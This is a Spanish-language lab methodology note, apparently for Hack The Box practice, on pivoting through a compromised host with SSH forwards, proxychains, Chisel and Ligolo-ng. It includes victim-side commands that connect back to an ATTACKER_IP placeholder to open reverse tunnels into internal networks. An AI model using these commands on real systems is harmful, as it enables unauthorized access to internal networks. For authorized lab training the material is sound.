---
title: HTB Pivoting and Tunneling
tags: [htb, methodology, pivoting, tunneling]
created: 2026-04-29
related:
  - "[[HTB/snippets/one-liners|One-liners]]"
  - "[[HTB/snippets/transfers|Transfers]]"
---

# HTB Pivoting and Tunneling

> [!abstract] TL;DR
> Pivoting = usar un host comprometido para llegar a redes/servicios internos. Primero descubrí rutas e interfaces; después elegí local forward, dynamic SOCKS o túnel completo.

## Enumerar red interna

Linux:

```bash
ip -br addr
ip route
ss -tulpen
```

Windows:

```cmd
ipconfig /all
route print
netstat -abno
arp -a
```

Buscar:

- interfaces extra;
- rutas a subredes internas;
- servicios en `127.0.0.1`;
- DNS internos;
- hosts en ARP cache.

## SSH local forward

Acceder a servicio interno desde tu máquina:

```bash
ssh -L 8080:127.0.0.1:80 user@$IP
```

Uso:

```text
http://127.0.0.1:8080 -> target:127.0.0.1:80
```

## SSH dynamic SOCKS

```bash
ssh -D 1080 user@$IP
```

`proxychains.conf`:

```text
socks5 127.0.0.1 1080
```

Uso:

```bash
proxychains nmap -sT -Pn -p80,445 10.10.20.5
proxychains curl http://10.10.20.5
```

## Chisel

Atacante:

```bash
chisel server -p 8000 --reverse
```

Víctima:

```bash
chisel client ATTACKER_IP:8000 R:socks
```

Proxy:

```text
socks5 127.0.0.1 1080
```

Forward puntual:

```bash
chisel client ATTACKER_IP:8000 R:8080:127.0.0.1:80
```

## Ligolo-ng

Atacante:

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
proxy -selfcert
```

Víctima:

```bash
agent -connect ATTACKER_IP:11601 -ignore-cert
```

Ruta:

```bash
sudo ip route add 10.10.20.0/24 dev ligolo
```

## Scanning por pivot

Preferir TCP connect:

```bash
proxychains nmap -sT -Pn -n -p22,80,445 10.10.20.5
```

Evitar SYN scan por SOCKS:

```text
-sS no funciona bien por proxy SOCKS. Usar -sT.
```

## Checklist

```text
[ ] Interfaces y rutas revisadas
[ ] Puertos internos identificados
[ ] Método elegido: SSH / Chisel / Ligolo
[ ] Proxychains configurado
[ ] Scan con -sT -Pn
[ ] Notas de hosts internos
[ ] Credenciales probadas en segmento interno
```
